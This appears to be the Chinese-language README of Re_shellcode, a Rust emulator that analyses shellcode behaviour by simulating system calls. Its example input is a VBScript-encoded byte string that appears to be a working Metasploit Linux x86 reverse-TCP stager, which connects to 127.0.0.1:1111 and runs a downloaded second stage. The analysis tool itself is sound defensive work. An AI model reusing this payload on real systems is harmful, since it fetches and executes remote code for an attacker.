# Re_shellcode

![Reshellcode.png](https://github.com/dDostalker/Re_shellcode/blob/main/.picture/Reshellcode.png?raw=true)



> **！！！项目目前只完成框架，缺少大量汇编指令和api的功能，目前只能对msf生成32/64位linux进行分析** 

Reshellcode是由rust构建的shellcode模拟运行动态分析器，通过模拟32/64位处理器、内存和基本Windows API/Linux系统调用运行环境来虚拟执行Shellcode以分析其行为。

### 原理

Shellcode为了实现特定的功能必须通过调用系统API来完成。Re_shellcode通过模拟执行以多个API来探测shellcode的行为。例如，创建文件和访问网络这些危险的API并没有真正的在本机执行，而是通过传回虚假的返回值来欺骗shellcode让其平稳运行。

### 优势

- 跨平台开源

  同时支持类Unix和Windows系统

- 文档数据捕获

  可以对多种语言的书写格式进行捕获加载（如rust、go、c、vbs、js……）

- 其他重要功能

  包括反汇编、内存监视、简单调试Shell、一键梭哈

- 支持不只x86架构，在未来会支持更多架构

### 使用方法

```shell
# 	带*的为唯一参数，带!的为正常运行不可遗漏参数
    --help 		-h	查看帮助*
    --version	-v	查看版本*
    --file		-f	选择单文件导入程序 后跟文件路径!
    --arch		-a	设置架构
    --debug		-b	调试模式
```

#### 目前支持架构

- x86
- x64

### 未来更新方向

- 补充汇编指令！
- 补充终端和winapi！
- 支持python/rust脚本将捕获数据解密
- 支持插入真实运行

### 示例

#### 文本内容

```vbscript
buf=Chr(106)&Chr(10)&Chr(94)&Chr(49)&Chr(219)&Chr(247)&Chr(227)&Chr(83)&Chr(67)&Chr(83)&Chr(106)&Chr(2)&Chr(176)&Chr(102)&Chr(137)&Chr(225)&Chr(205)&Chr(128)&Chr(151)&Chr(91)&Chr(104)&Chr(127)&Chr(0)&Chr(0)&Chr(1)&Chr(104)&Chr(2)&Chr(0)&Chr(4)&Chr(87)&Chr(137)&Chr(225)&Chr(106)&Chr(102)&Chr(88)&Chr(80)&Chr(81)&Chr(87)&Chr(137)&Chr(225)&Chr(67)&Chr(205)&Chr(128)&Chr(133)&Chr(192)&Chr(121)&Chr(25)&Chr(78)&Chr(116)&Chr(61)&Chr(104)&Chr(162)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(106)&Chr(0)&Chr(106)&Chr(5)&Chr(137)&Chr(227)&Chr(49)&Chr(201)&Chr(205)&Chr(128)&Chr(133)&Chr(192)&Chr(121)&Chr(189)&Chr(235)&Chr(39)&Chr(178)&Chr(7)&Chr(185)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(137)&Chr(227)&Chr(193)&Chr(235)&Chr(12)&Chr(193)&Chr(227)&Chr(12)&Chr(176)&Chr(125)&Chr(205)&Chr(128)&Chr(133)&Chr(192)&Chr(120)&Chr(16)&Chr(91)&Chr(137)&Chr(225)&Chr(153)&Chr(178)
buf=buf&Chr(106)&Chr(176)&Chr(3)&Chr(205)&Chr(128)&Chr(133)&Chr(192)&Chr(120)&Chr(2)&Chr(255)&Chr(225)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(187)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(205)&Chr(128)
```

#### 执行命令

```powershell
.\Reshellcode.exe -f ".\shellcode_linux_x86\shellcode-vbs.txt" -a x86 -b
```

![Reshellcode1.png](https://github.com/dDostalker/pictures/blob/main/Reshellcode1.png?raw=true)

![Reshellcode2.png](https://github.com/dDostalker/pictures/blob/main/Reshellcode2.png?raw=true)

![Reshellcode3.png](https://github.com/dDostalker/pictures/blob/main/Reshellcode3.png?raw=true)

